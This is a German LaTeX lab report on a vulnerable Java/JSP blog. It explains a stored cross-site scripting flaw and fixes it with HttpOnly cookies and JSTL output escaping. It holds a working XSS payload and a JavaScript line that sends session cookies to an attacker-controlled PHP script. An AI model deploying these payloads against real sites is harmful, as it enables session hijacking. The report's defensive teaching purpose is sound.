\section{App1 - Blog in Java mit JSP}

\subsection{Vulnerability: Cross-Site Scripting}

Das Blog ist anfällig für Cross-Site Scripting. Das Problem liegt darin, dass die Eingabedaten beim Erzeugen eines neuen Blog-Eintrags nur unzureichend gefiltert werden. Beim erneuten Anzeigen eines betroffenen Blog-Eintrags werden diese Daten - die z. B. beliebigen JavaScript-Code enthalten können - dann an den Browsers gesendet und dort ausgeführt.

\subsubsection{Ein harmloses Beispiel}

Ein konkretes Beispiel für einen Angriff: Der Angreifer \emph{evil\_hacker} legt einen neuen Blog-Eintrag an. Im Formular auf \url{newPost.html} gibt er als Benutzernamen wahrheitsgemäß \lstinline$evil_hacker$ ein. Als Text des Blog-Eintrags wählt er \lstinline$<SCRIPT SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js></SCRIPT>$.

Im Servlet, das den Post-Request entgegen nimmt (\url{gui.controller.BlogServlet}) wird die Eingabe zwar validiert, bevor sie in die (In-Memory-)Datenbank geschrieben wird. Leider ist der verwendete Validator (\url{gui.helper.ScriptTagValidator}) nicht ausreichend. Die verwendete Regular Expression \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *>.*"$ matcht nur Script-Tags, die keine Attribute zwischen dem Wort "script" und der schließenden Spitz-Klammer enthalten. Durch die Angabe \lstinline$SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js$ lässt sich der Validator also in die Irre führen und lässt die Eingabe ungefiltert durch.

Auf dem Webspace von \emph{evil\_hacker} liegt unter der URL \url{SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js} eine JavaScript-Datei mit dem folgenden Inhalt:

\begin{lstlisting}
document.write('This is the evil script!')
\end{lstlisting}

Da bei der Ausgabe der Blog-Einträge die Inhalte überhaupt nicht mehr gefiltert werden, wird also der folgende Text als Blog-Eintrag wieder ausgegeben (z. B. in archive.jsp). Im Browser wird das Script-Tag dann so behandelt, als würde es aus vertrauenswürdiger Quelle kommen: Das Script von der angegebenen URL wird heruntergeladenen und ausgeführt. Im konkreten Fall wird dadurch an der Stelle, an der sich das Script-Tag befand der Text "This is the evil script" ausgegeben. (Der Vollständigkeit halber soll darauf hinwiesen werden, dass der Angriff auch funktionieren würde, wenn der Angreifer das Script-Tag als Autoren-Namen und nicht als Blog-Text eingegeben hätte, da diese beiden Werte auf exakt dieselbe Art behandelt werden.)

Im vorliegenden Fall handelt es sich natürlich nur um einen harmlosen "Spass" - schließlich hätte der Angreifer ja auch gleich "This is the evil script" als Blog-Text eintragen können. Und da das Blog über nur einen sehr eingeschränkten Funktionsumfang verfügt, gibt es auch nicht viel zu zerstören oder auszuspionieren. Lediglich die Session-ID, welche in einem Cookie abgespeichert wird, stellt ein mögliches Ziel für tatsächlich gefährliche Angriffe dar - nämlich für einen sogenannten Session Hijacking-Angriff.

\subsubsection{Tatsächlicher Angriff: Session Hijacking}

Nehmen wir, der Angreifer erweitert sein Script, und fügt dabei zwei Befehle hinzu, die den Inhalt des Cookies an ein Skript auf dem Webserver des Angreifers schicken (zu Demonstrationszwecken gibt das Skript den Inhalt des Cookies auch noch als Teil der Website aus):

\begin{lstlisting}
document.write('This is the evil script!');

document.write('Cookie contents: ' + escape(document.cookie));
document.write('<img src=\'http://web.student.tuwien.ac.at/~e9902433/steal_the_sessionID.php?s='+escape(document.cookie)+'\' />');
\end{lstlisting}

Das Skript \url{steal_the_sessionID.php} kann dann die SessionID aus dem Cookie extrahieren und der Angreifer hätte dann über die SessionID Zugriff auf die Session des Opfers. Die Website könnte dann nicht mehr zwischen dem Opfer und dem Angreifer unterscheiden und der Angreifer hätte Zugriff auf eventuell gespeicherte private Daten des Opfers, etc.

\subsubsection{HttpOnly?}

Seit einigen Jahren existiert gegen diese Art des Angriffs eine Sicherheitsvorkehrung, die das Stehlen von Cookie-Daten verhindern soll. Beim Setzen des Cookies kann der Webserver diesen als "HttpOnly" kennzeichnen. Dies ist ein Hinweis für den Browser, dass dieser Wert einem clientseitigen Script nicht zugänglich gemacht werden darf. Moderne Browser verstehen diese Hinweis und schützen daher die SessionID vor dem oben beschriebenen Session Hijacking-Angriff.

In der \url{README}-Datei unseres Java-Blogs wird behauptet, die Cookies wären als "HttpOnly" gekennzeichnet. Ein Blick in die Server-Konfigurations-Datei \url{web.xml} scheint jedoch das Gegenteil zu zeigen. Diese Datei enthält unter anderem den folgenden Abschnitt:

\begin{lstlisting}
<session-config>
	<cookie-config>
		<http-only>
			false
		</http-only>
	</cookie-config>
</session-config>
\end{lstlisting}

Weitere Internetrecherchen (z. B. unter \url{http://software-security.sans.org/blog/2010/08/11/security-misconfigurations-java-webxml-files}) zeigen jedoch, dass der ganze gezeigte Abschnitt in der Konfigurationsdatei eigentlich überflüssig ist: Tomcat 7 ist offenbar per Default so konfiguriert, dass alle Cookies HttpOnly sind. Tatsächlich kann diese serverweite Default-Konfiguration nicht einmal durch die Angaben in \url{web.xml} überschrieben werden. Der gezeigt Abschnitt scheint also - glücklicherweise - einfach wirkungslos zu sein. Lediglich in dem Fall, dass die serverweite Konfiguration HttpOnly ausschalten sollte, würden die Angaben in \url{web.xml} wirksam werden - in diesem Fall würde durch den gezeigten Abschnitt tatsächlich eine Sicherheitslücke geöffnet.

Zusammenfassend konnten in diesem Blog-Programm also zwei Sicherheitslücken identifiziert werden:

\begin{enumerate}
\item Eine Anfälligkeit für Cross-Site Scripting
\item Die Konfiguration der Cookies ist widersprüchlich, für den Administrator verwirrend und enthält - je nach Server-Konfiguration - eine Sicherheitslücke
\end{enumerate}

Der folgende Abschnitt beschreibt Möglichkeiten, diese Sicherheitslücken zu schließen.

\subsection{Lösung - Teil 1: HttpOnly}

Der erste und einfachste Teil der Lösung besteht darin, die Cookies tatsächlich als HttpOnly zu konfigurieren. Dafür der oben gezeigt Ausschnitt aus web.xml folgendermaßen angepasst werden:

\begin{lstlisting}
<session-config>
	<cookie-config>
		<http-only>
			true
		</http-only>
	</cookie-config>
</session-config>
\end{lstlisting}

Dies würde die Cookies auch dann schützen, wenn die serverweite Konfiguration von Tomcat die Cookies standardmäßig auf nicht HttpOnly setzen sollte.

Die Cookies so zu schützen ist sinnvoll, aber nicht ausreichend. Verwendet der User nämlich einen älteren Browser, ist es denkbar, dass dieser den Hinweis "HttpOnly" nicht versteht und daher die SessionID einem Script zugänglich macht. Ein Session Hijacking wäre damit also denkbar. Daher ist es notwendig, auch die Anfälligkeit gegen Cross-Site Scripting zu beheben.

\subsection{Lösung - Teil 2: Schutz gegen Cross-Site Scripting}

\subsubsection{Bessere Regular Expressions?}

Ein erster Versuch, das Programm sicherer zu machen, wäre, die Regular Expression anzupassen, so dass auch Script-Tags mit einem src-Attribut als gefährlich erkannt und ausgefilter würden. Also z. B. \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *([Ss][Rr][Cc].*)+>.*"$. Dies ist allerdings fehleranfällig und lässt außerdem andere Möglichkeiten des Cross-Site Scripting außer Acht.

\subsubsection{Besser: Escapen beim erneuten Anzeigen}

Die einfachste Lösung, um Cross-Site Scripting in diesem konkreten Fall vorzubeugen, liegt darin, die Blog-Daten (Autoren und Inhalte) nicht bei der Eingabe, sondern erst bei der Ausgabe zu filtern. Anders als z. B. bei Formen der SQL-Injection ist der Code im Rahmen eines Cross-Site Scripting Angriffs erst dann gefährlich, wenn er wieder an einen Browser ausgegeben wird. Da auf dem Server kein HTML nach Script-Tags geparst und kein JavaScript interpretiert wird, ist z. B. der oben gezeigt Angriff für den Server ungefährlich.

Sinnvoller ist es daher, die gespeicherten Daten erst bei der erneuten Ausgabe zu filtern und gegebenenfalls in eine Form zu transformieren, die dem Opfer nicht mehr gefährlich werden kann. Im konkreten Fall heißt das: In eine Form, die vom Browser des Opfers nicht als JavaScript-Tag erkannt und daher auch nicht ausgeführt (sondern einfach als Inhalt der Website dargestellt) wird. Diese Transformation ist allgemein als Escapen bekannt: Dabei werden potentiell gefährliche Zeichen wie < und > durch entsprechende Escape-Sequenzen ersetzt. Der Angriffs-Text aus dem Beispiel wird dadurch zu \lstinline$&lt;SCRIPT SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js&gt;&lt;/SCRIPT&gt;$. Aus der Sicht des Web-Browsers ist dies überhaupt kein Script-Tag mehr, sondern einfach eine Zeichenkette, die mit dem Zeichen \lstinline$&lt$ beginnt. Als solche wird sie einfach als Inhalt der Website 

Eine kurze Recherche im Internet zeigt, dass Variablen-Werte in Servlet-Tags in JSP generell nicht gefiltert/escaped werden. Im Gegensatz dazu werden Variablen-Werte in \emph{Expression Language-Tags} in JSP (per Default) \emph{immer} escaped. Um die Ausgabe-Werte zu escapen ist es also lediglich notwendig, die entsprechenden Servlet-Abschnitte durch Expression Language zu ersetzen, genauer gesagt durch <c:forEach> für den Schleifen-Durchgang und <c:out> für die eigentliche Ausgabe. Das Tag <c:out> führt dann das eigentlich Escapen durch.

Die beiden folgenden Code-Beispiele zeigen die Änderungen am Beispiel von \url{archive.jsp}. Das erste Beispiel zeigt die anfällige Variante, das zweite Beispiel die verbesserte Version.

\begin{lstlisting}
<jsp:useBean id="bean" class="gui.model.SearchResultBean" scope="session"/>
<%@page import="gui.model.PostBean"%>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
<%for (PostBean post:bean.getResults()){ %>
<div class=post>
	<h3 class=author>
		<%=post.getAuthor() %>
	</h3>
	<div class=content>
		<%=post.getContent() %>
	</div>
</div>
<%} %>
</body>
</html>
\end{lstlisting}

\begin{lstlisting}
<jsp:useBean id="bean" class="gui.model.SearchResultBean" scope="session"/>
<%@ page import="gui.model.PostBean"%>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>    
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert Titel here</title>
</head>
<body>
<c:forEach var="post" items="${sessionScope.bean.results}">
<p>Entry</p>
<div class=post>
	<h3 class=author>
		<c:out value="${post.author}"/>
	</h3>
	<div class=content>
		<c:out value="${post.content}"/>
	</div>
</div>
</c:forEach>
</body>
</html>
\end{lstlisting}

Man beachte, dass zwei weitere Veränderungen notwendig sind, um die EL-Tags verwenden zu können.
\begin{enumerate}
\item In der betreffenden JSP-Datei muss das Tag-Libary durch eine entsprechende taglib-Direktive deklariert werden. 
\item Da Tomcat nicht mit den Archiven der Java Standard Tag Library ausgeliefert wird, müssen diese heruntergeladen und im Verzeichnis WEB-INF/lib abgelegt werden.
\end{enumerate}

Nicht nur \url{archive.jsp} war in der ursprünglichen Version anfällig für das Cross-Site Scripting. Auf ähnliche Weise mussten auch die Tags in \url{index.jps}, \url{post.jsp} und \url{searchResults.jsp} angepasst werden.

\subsection{Aktuelle Fälle}

Vulnerabilities gegen Cross-Site Scripting treten immer wieder auch auf den renommiertesten Websites auf. Eine Website zu diesem Thema (\url{http://www.xssed.com/}, sprich: "cross-site scripted") berichtet z. B. über Vulnerabilities bei Amazon (\url{http://www.xssed.com/news/122/Amazon_hit_by_persistent_XSS_vulnerability/}), PayPal (\url{http://www.xssed.com/news/126/EV_SSL-secured_live_PayPal_site_vulnerable_to_XSS/}) und sogar bei Unternehmen, die sich auf Software-Sicherheit spezialisieren wie McAfee und Symantec (\url{http://www.xssed.com/news/130/F-Secure_McAfee_and_Symantec_websites_again_XSSed/}).

 
